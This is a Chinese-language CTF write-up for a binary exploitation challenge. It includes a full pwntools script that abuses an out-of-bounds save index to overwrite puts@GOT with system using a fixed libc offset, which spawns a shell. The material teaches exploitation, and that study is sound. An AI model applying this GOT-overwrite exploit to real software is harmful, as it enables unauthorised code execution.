# Got it!

## 题目简述

程序的存档数组存在索引越界，可影响当前存档指针 `now_save`。二进制为 Partial RELRO，`puts@GOT` 可写；虽然没有 libc 泄漏，已知同一份 libc 中 `system` 与 `puts` 的偏移差固定，因此可把 GOT 表项从 `puts` 平移到 `system`。

## 解题过程

先在第 0 个存档中写入整数形式的 `/bin/sh\x00`，使存档缓冲区开头成为稍后调用 `system` 的参数。再次进入功能时选择越界索引 16，配合题目中的加减操作把 `now_save` 调整到 `puts@GOT`；随后加上

$$
\Delta = \operatorname{offset}(system)-\operatorname{offset}(puts)
$$

即可把原来的 `puts` 运行时地址改成 `system`。

```python
from pwn import ELF, p64, remote, u64

elf = ELF("./pwn")
libc = ELF("./libc.so.6", checksec=False)
io = remote("host", 10000)

def add(value):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Operand", str(value).encode())

def sub(value):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Operand", str(value).encode())

# 在 saves[0] 放置命令字符串。
io.sendlineafter(b"3. Exit", b"1")
io.sendlineafter(b"use?", b"0")
add(u64(b"/bin/sh\x00"))
io.sendlineafter(b"> ", b"5")

# 越界索引配合 -0x100，把 now_save 指到 puts@GOT。
io.sendlineafter(b"3. Exit", b"1")
io.sendlineafter(b"use?", b"16")
sub(0x100)
add(libc.sym["system"] - libc.sym["puts"])

# 后续 puts(saves) 等价于 system("/bin/sh")。
io.sendlineafter(b"> ", b"5")
io.sendline(b"3")
io.interactive()
```

## 方法总结

Partial RELRO 的关键影响是 GOT 仍可写。若只能对函数指针做加减而不能读出地址，可以利用目标随 libc 基址共同平移这一事实：同一 libc 内两个符号的地址差不受 ASLR 影响。前提是本地使用的 libc 与远端一致。
